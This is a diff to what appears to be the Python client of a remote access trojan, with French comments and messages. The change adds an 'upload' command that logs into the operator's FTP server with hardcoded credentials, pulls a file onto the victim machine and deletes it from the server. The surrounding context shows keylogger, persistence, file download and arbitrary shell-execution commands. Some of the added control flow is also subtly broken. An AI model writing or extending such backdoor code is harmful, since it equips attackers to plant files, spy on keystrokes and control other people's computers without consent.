@@ -84,6 +84,28 @@
                 else:
                     output = "Download a besoin d'une option"
 
+                if command.lower() != "upload":
+
+                    if splited_command[0].lower() == "upload":
+                        path_fichier = splited_command[1]
+                        ftp = FTP('')
+                        ftp.connect(self.host, (self.port+2))
+                        ftp.login(user='user', passwd = '12345')
+                        fichier = path_fichier
+                        try:
+                            file = open(fichier, 'wb')
+                            try:
+                                ftp.retrbinary('RETR '+fichier, file.write)
+                                ftp.delete(fichier)
+                                output = "Fichier uploader"
+                            except:
+                                output = "Erreur le fichier n'a pas été uploader"
+                        except:
+                            output = "Erreur le fichier ne peut pas etre ecrit sur le disque"
+                        file.close() # on ferme le fichier
+                else:
+                    output = "Upload a besoin d'une option"
+
                 if command.lower() != "keylogger":
 
                     if splited_command[0].lower() == "keylogger":
@@ -160,7 +182,9 @@
                     else:
                         # if operation is successful, empty message
                         output = ""
-                elif splited_command[0].lower() != "keylogger" and splited_command[0].lower() != "persistance" and splited_command[0].lower() != "cat" and splited_command[0].lower() != "download":
+                elif splited_command[0].lower() != "keylogger" and splited_command[0].lower() != "persistance" \
+                    and splited_command[0].lower() != "cat" and splited_command[0].lower() != "download" \
+                        and splited_command[0].lower() != "upload":
                     # execute the command and retrieve the results
 
                     """
